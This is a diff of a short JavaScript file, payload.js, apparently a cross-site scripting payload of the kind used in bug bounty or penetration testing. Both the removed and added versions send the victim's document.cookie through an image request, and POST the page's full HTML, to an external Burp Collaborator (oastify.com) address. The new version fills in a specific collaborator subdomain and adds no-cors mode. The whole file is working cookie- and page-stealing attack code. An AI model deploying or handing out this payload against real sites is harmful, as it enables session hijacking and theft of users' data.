@@ -1,17 +1,17 @@
 // payload.js
 (function(){
-  // Log that we executed
-  console.log("🔥 XSS payload.js executed");
+  console.log("[🔥] XSS payload.js executed");
 
-  // Send cookies to your Burp Collaborator or OAST server
-  new Image().src = "https://yourid.oastify.com/?cookie=" + encodeURIComponent(document.cookie);
+  // 1. Send cookies to Burp Collaborator
+  new Image().src = "https://aft0o7apafvlz829z8t1kj1fq6w2k08p.oastify.com/?c=" + encodeURIComponent(document.cookie);
 
-  // Send full DOM
-  fetch("https://yourid.oastify.com/dom", {
+  // 2. Send full DOM as POST request
+  fetch("https://aft0o7apafvlz829z8t1kj1fq6w2k08p.oastify.com/dom", {
     method: "POST",
+    mode: "no-cors",
     body: document.documentElement.outerHTML
   });
 
-  // Optional: Add persistent visual signal
-  document.body.style.border = "5px solid red";
+  // 3. Optional visual indicator
+  document.body.style.border = "5px solid crimson";
 })();
